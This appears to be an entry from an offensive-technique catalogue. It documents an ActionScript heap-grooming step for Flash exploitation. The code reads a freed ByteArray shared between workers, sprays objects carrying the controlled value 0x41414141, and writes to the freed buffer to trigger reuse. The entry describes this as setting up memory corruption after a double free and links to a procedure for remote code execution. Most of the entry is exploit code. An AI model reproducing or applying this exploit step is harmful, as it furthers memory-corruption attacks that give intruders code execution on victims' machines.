---
id: c4g5h6i7-j8k9-0124-ghij-789012345678
data: >-
  var freedByteArray:ByteArray = Worker.current.getSharedProperty("byteArray");
  for (var i:int = 0; i < 100; i++) { var filler:Object = new Object();
  filler.ptr = 0x41414141; } freedByteArray.writeBytes(new ByteArray());
tags:
  - heap-groom
  - corruption
type: command
output: null
executor: actionscript
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:18.588Z'
verified: false
validated: true
submitted: true
---
# actionscript-heap-groom

## Command

```actionscript
var freedByteArray:ByteArray = Worker.current.getSharedProperty("byteArray");
for (var i:int = 0; i < 100; i++) {
    var filler:Object = new Object();
    filler.ptr = 0x41414141; // Controlled data
}
freedByteArray.writeBytes(new ByteArray());
```

## Description

Grooms the heap after double free to position controlled data for memory corruption in Flash.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `filler.ptr` | Overwrite payload | Yes |
| `writeBytes` | Trigger reuse | Yes |

## Examples

### Basic Usage

```actionscript
for (var i:int=0; i<50; i++) { new Object(); }
```

## Expected Output

Heap slots filled for overwrite.

## Related

- [[Related Procedure: Achieve-Memory-Corruption-and-RCE]]
